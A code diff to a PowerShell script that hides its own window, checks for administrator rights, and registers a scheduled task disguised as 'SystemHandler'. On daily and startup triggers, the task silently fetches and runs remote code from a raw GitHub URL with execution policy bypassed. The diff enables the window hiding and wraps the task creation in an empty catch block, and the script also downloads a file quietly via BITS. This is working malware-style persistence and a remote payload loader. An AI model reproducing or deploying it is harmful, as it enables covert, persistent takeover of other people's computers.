@@ -20,7 +20,7 @@ public class WindowHelper
     }
 }
 "@; 
-#[WindowHelper]::HideWindow();
+[WindowHelper]::HideWindow();
 
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
 {
@@ -91,20 +91,23 @@ foreach ($key in $keys)
     }
 };
 
-# Ensure the ScheduledTasks module is available
-Import-Module ScheduledTasks
+try
+{
+    # Ensure the ScheduledTasks module is available
+    Import-Module ScheduledTasks
 
-# Define task parameters
-$taskName = "SystemHandler"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'iex (iwr \"https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i\" -UseBasicP)'"
+    # Define task parameters
+    $taskName = "SystemHandler"
+    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command 'iex (iwr \"https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i\" -UseBasicP)'"
 
-# Create the scheduled task object and register it
-Register-ScheduledTask -TaskName $taskName `
-                        -Action $action `
-                        -Trigger $triggerDaily, $triggerStartup `
-                        -Principal $principal `
+    # Create the scheduled task object and register it
+    Register-ScheduledTask -TaskName $taskName `
+                            -Action $action `
+                            -Trigger $triggerDaily, $triggerStartup `
+                            -Principal $principal `
 
-Write-Host "Scheduled task '$taskName' created successfully."
+    Write-Host "Scheduled task '$taskName' created successfully."
+} catch {}
 
 # Download using BitsTransfer
 Start-BitsTransfer -Source $install_url -Destination $install_path -ErrorAction SilentlyContinue;
